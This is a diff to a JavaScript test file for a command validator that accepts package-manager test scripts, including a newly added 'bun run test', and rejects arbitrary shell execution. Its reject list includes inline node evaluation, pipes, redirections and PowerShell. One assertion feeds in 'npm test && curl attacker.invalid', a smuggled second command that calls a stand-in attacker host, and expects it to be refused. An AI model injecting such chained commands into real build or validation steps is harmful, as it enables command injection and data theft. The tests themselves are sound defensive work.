@@ -16,6 +16,7 @@ test('rejects unknown fields, duplicate ids, invalid command refs and timeout',(
 test('host validation accepts bounded package scripts and rejects arbitrary shell execution',()=>{
   assert.deepEqual(parseValidationCommand('npm test'),{manager:'npm',script:'test',args:[]})
   assert.deepEqual(parseValidationCommand('pnpm run test:unit -- --test-name-pattern=security'),{manager:'pnpm',script:'test:unit',args:['--test-name-pattern=security']})
+  assert.deepEqual(parseValidationCommand('bun run test'),{manager:'bun',script:'test',args:[]})
   for(const command of [
     'node --test',
     'node -e process.exit(0)',
@@ -23,6 +24,7 @@ test('host validation accepts bounded package scripts and rejects arbitrary shel
     'npm test | tee out.txt',
     'npm test > out.txt',
     'npx vitest',
+    'bun test',
     'pwsh -Command Get-ChildItem',
   ]) assert.throws(()=>parseValidationCommand(command))
   const bad=structuredClone(plan);bad.validationCommands[0].command='npm test && curl attacker.invalid';assert.throws(()=>validatePlanArtifact(bad),/command unsafe/)
